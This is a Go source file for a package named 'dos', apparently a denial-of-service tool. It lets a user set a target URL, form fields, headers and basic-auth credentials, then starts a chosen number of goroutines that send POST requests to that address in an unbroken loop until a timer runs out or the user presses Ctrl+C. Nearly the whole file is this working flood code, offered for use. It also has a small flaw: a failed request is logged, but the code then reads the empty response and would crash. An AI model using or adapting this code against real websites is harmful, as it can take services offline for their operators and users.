// Author: PiereLucas

package dos

import (
	"context"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// TargetInf - struct for webaddress and formnames
type TargetInf struct {
	webaddress string
	formnames  url.Values
	headers    map[string]string
	basicAuth  []string
	authSet    bool
}

var (
	infoIntern       TargetInf
	authUser         string
	authPass         string
	persistenHeaders http.Header
)

// AddWebaddress - Add webaddress to TargetInf.webaddress
func (inf *TargetInf) AddWebaddress(webAddress string) string {
	inf.webaddress = webAddress
	return inf.webaddress
}

// AddForm - Add formname to TargetInf.formnames
func (inf *TargetInf) AddForm(formName string, formValue string) url.Values {
	if inf.formnames == nil {
		_ = inf.MakeForms()
	}
	inf.formnames.Add(formName, formValue)
	return inf.formnames
}

// AddHeader - Add header to TargetInf.headers
func (inf *TargetInf) AddHeader(key string, value string) map[string]string {
	if inf.headers == nil {
		_ = inf.MakeHeaders()
	}
	inf.headers[key] = value
	return inf.headers
}

// AddAuth - Add basic HTTP authentication user and password
func (inf *TargetInf) AddAuth(user string, password string) []string {
	inf.basicAuth = append(inf.basicAuth, user, password)
	inf.authSet = true
	return inf.basicAuth
}

// MakeForms - initialize the internal Values struct.
// This function is process using TargetInf.AddForm
func (inf *TargetInf) MakeForms() url.Values {
	inf.formnames = url.Values{}
	return inf.formnames
}

// MakeHeaders - initialize the internal header map.
// This function is process using TargetInf.AddHeader
func (inf *TargetInf) MakeHeaders() map[string]string {
	inf.headers = make(map[string]string)
	return inf.headers
}

// Copy - Copy the TargetInf Struct
func (inf *TargetInf) Copy() TargetInf {
	return *inf
}

func makeRequest(done chan<- struct{}) {
	hc := http.Client{} // Initalize default client

	result := make(chan *http.Request)
	go buildRequest(result) // Building our request
	req := <-result         // Wait for our request

	r := runtime.NumGoroutine()
	resp, err := hc.Do(req)
	if err != nil {
		log.Printf("ERROR: do post request: %s\n", err)
	}

	defer resp.Body.Close() // Close response body at end of function

	if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
		log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | %s\n", r, infoIntern.webaddress)
	} else {
		log.Printf("\tRoutine: %6d | Argh! Broken [%d] | %s\n", r, resp.StatusCode, infoIntern.webaddress)
	}

	close(result) // Close request result channel
	close(done)   // sending empty data to done channel
}

func runner(ctx context.Context, start <-chan struct{}) {
	<-start // Starting routine on close of channel starter

	for {
		select {
		case <-ctx.Done(): // Quit routine on receive
			return // Close runner goroutine
		default:
			func() {
				done := make(chan struct{})
				go makeRequest(done)
				<-done
			}()
		}
	}
}

func start(ctx context.Context, done chan<- struct{}, threadN int) {
	start := make(chan struct{})

	for i := 1; i < threadN+1; i++ {
		log.Printf("INFO: Starting routine: %d\n", i)
		go runner(ctx, start)
	}

	// Build initial request
	func() {
		log.Println("INFO: Building Initial Request")
		result := make(chan *http.Request) // create channel result
		go buildRequest(result)            // Building initial request
		_ = <-result
		close(result) // Wait for initial request to be done
	}()

	close(start) // close channel starter to start runner routines
	close(done)  // synchronise and unlock sync in parent function
}

func buildRequest(result chan<- *http.Request) {
	// Building initial request and add values to request
	req, err := http.NewRequest("POST", infoIntern.webaddress, strings.NewReader(infoIntern.formnames.Encode()))
	if err != nil {
		log.Println("ERROR: building request")
	}

	req.PostForm = infoIntern.formnames // add url.Values too request

	// add headers and authorization (if set) to request and make it persistent
	if persistenHeaders == nil {
		for key, value := range infoIntern.headers {
			req.Header.Set(key, value)
		}
		if infoIntern.authSet {
			req.SetBasicAuth(authUser, authPass)
			tempVal := req.Header.Values("Authorization")[0]
			req.Header.Set("Authorization", tempVal)
		}
		persistenHeaders = req.Header.Clone()
	} else {
		req.Header = persistenHeaders
	}
	result <- req
}

func buildingDataAndCh(info *TargetInf) {
	infoIntern = info.Copy() // Build global struct

	if infoIntern.authSet {
		authUser = infoIntern.basicAuth[0]
		authPass = infoIntern.basicAuth[1]
	}
}

func validateThreads(threads int, done chan<- struct{}) {
	d := runtime.NumCPU()
	if d < threads {
		log.Printf("WARNING: more threads: %d than cores: %d\n", threads, d)
		time.Sleep(3 * time.Second)
	}
	close(done)
}

// Dos - start Dos and returns error or nil
func Dos(threads int, timeInSeconds int, info *TargetInf, done chan<- struct{}) {
	dostime := time.Duration(timeInSeconds) * time.Second

	ctx, cancel := context.WithTimeout(context.Background(), dostime) // Intialize context with timeout
	defer cancel()

	// catch SIGINT (CTRL+C) and os.Interrupt
	c := make(chan os.Signal, 1)
	go func() {
		signal.Notify(c, os.Interrupt, syscall.SIGTERM)
		<-c
		log.Printf("\nABORT: you pressed ctrl+c\n")
		cancel()
		/*
			for sig := range c {
				// sig is a ^C, handle it
			}
		*/
	}()

	buildingDataAndCh(info) // build the datastructure from TargetInf struct and initialize channels
	sync := make(chan struct{})
	go validateThreads(threads, sync)
	<-sync

	sync = make(chan struct{})
	go start(ctx, sync, threads) // start routines
	<-sync                       // wait for start routine

	<-ctx.Done() // wait for contex done
	close(done)
}
